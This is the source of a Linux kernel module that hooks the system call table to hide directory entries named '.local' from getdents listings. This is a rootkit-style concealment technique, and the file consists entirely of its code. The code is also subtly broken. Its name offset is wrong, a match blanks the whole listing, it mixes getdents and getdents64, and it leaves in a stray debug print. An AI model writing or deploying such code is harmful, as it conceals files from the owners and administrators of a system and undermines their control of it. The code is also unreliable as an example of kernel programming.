#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>

MODULE_AUTHOR("Navid_Bardia");
MODULE_DESCRIPTION("Hide a file from getdents syscalls");
MODULE_LICENSE("GPL");

void **sys_call_table;


asmlinkage int (*original_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
        int rtn;
        struct linux_dirent64 *cur = dirp;
        int i = 0;
        rtn = original_getdents64(fd, dirp, count);
        while (i < rtn) {
  if(strncmp(cur->d_name-1, ".local", 6)==0){
                       return 0;
                }
                i += cur->d_reclen;
                cur = (struct linux_dirent64*) ((char*)dirp + i);
        }
 printk("uuuuuuu %s", cur->d_name-1);
        return rtn;
}

int set_page_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
    return 0;
}

int set_page_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    return 0;
}

static int __init getdents_hook_init(void)
{

    sys_call_table = (void*)kallsyms_lookup_name("sys_call_table");
    original_getdents64 = sys_call_table[__NR_getdents];


    set_page_rw(sys_call_table);
    sys_call_table[__NR_getdents] = sys_getdents64_hook;
        return 0;
}

static void __exit getdents_hook_exit(void)
{
    sys_call_table[__NR_getdents] = original_getdents64;
    set_page_ro(sys_call_table);
}

module_init(getdents_hook_init);
module_exit(getdents_hook_exit);
